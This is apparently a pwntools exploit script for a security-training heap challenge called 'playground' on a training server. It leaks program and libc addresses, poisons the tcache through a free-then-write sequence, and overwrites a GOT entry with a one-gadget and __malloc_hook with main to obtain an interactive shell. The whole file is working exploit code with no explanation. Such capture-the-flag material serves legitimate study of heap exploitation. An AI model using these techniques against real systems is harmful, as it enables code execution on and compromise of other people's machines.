from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    if "NORMAL" not in args:
        r = process("./playground")
        gdb.attach(r, """
        c
        """)
    else:
        r = process("./playground")    
else:
    r = remote("bin.training.offdef.it", 4110)


reference_main = 0x55981cbd71d9
reference_got_malloc = 0x55981cbda050
reference_minHeap = 0x55981cbda0a8

def atoi(str):
    resultant = 0
    for i in range(len(str)):
        resultant = resultant * 10 + (ord(str[i]) - ord('0'))        #It is ASCII substraction 
    return resultant

def malloc(size):
    global last3nimbles
    r.recvuntil(b"> ")
    tosend = "malloc " + str(size)
    r.sendline(tosend.encode("ascii"))
    r.recvuntil(b"> ")
    # address = r.read(11).decode()
    # address = int(address, 16)
    # address = address << 12
    # address = address + last3nimbles
    # last3nimbles = last3nimbles + size + 16
    address = r.recvline()
    address = address[:-1]
    #print(address)
    address = int(address,16)
    print("[!]  address: %#x" %address)

    return address
    
def free(add):
    r.recvuntil(b"> ")
    tosend = "free %#x" %add
    r.sendline(tosend.encode("ascii"))
    r.recvuntil(b"> ")
    r.recvline()

def show(add):
    r.recvuntil(b"> ")
    tosend = "show %#x 1" %add
    r.sendline(tosend.encode("ascii"))
    r.recvuntil(b": ")
    res = r.recvline()
    res = res[:-1]
    return int(res,16)


def write(address, payload):
    r.recvuntil(b"> ")
    print("sending  " + "write "+str(hex(address))+" "+str(len(payload)) + str(payload))
    r.sendline("write "+str(hex(address))+" "+str(len(payload)))
    input("wait")
    r.recvline()
    #print(r)
    r.send(payload)
    r.recvline()


r.recvline()
r.recvuntil(b": ")
address = r.recvline()
address = address[:-1]
leaked_main = int((address),16)
print("main:  " + str(hex(leaked_main)))


leaked_min = leaked_main + (reference_minHeap-reference_main)
leaked_got_malloc = leaked_main + (reference_got_malloc -reference_main)
leaked_malloc_libc = show(leaked_got_malloc)

libc_base = leaked_malloc_libc - 0x97020
mall_hook_off = 0x7ff563debc30 - 0x7ff563a00000
mall_hook = libc_base + mall_hook_off
print("libc:  " + str(hex(libc_base)))
print("hook:  " + str(hex(mall_hook)))

ad1 = malloc(0x40)
ad2 = malloc(0x40)

free(ad1)
free(ad2)

input("wait")
write(ad2,(leaked_min+5+8-0x10).to_bytes(8,byteorder='little'))
input("wait")


malloc(0x40)

min = malloc(0x40)
input("wait")
write(leaked_min-8,(0xffff5555555580a8).to_bytes(8,byteorder='little'))

input("wait")


getpid = leaked_got_malloc-0x28
write(getpid,(libc_base+0x4f302).to_bytes(8,byteorder='little'))
write(mall_hook,(leaked_main).to_bytes(8,byteorder='little'))

#write(0x7ffda33d9808,b"\x00" * 0xfda33d9808)

r.interactive()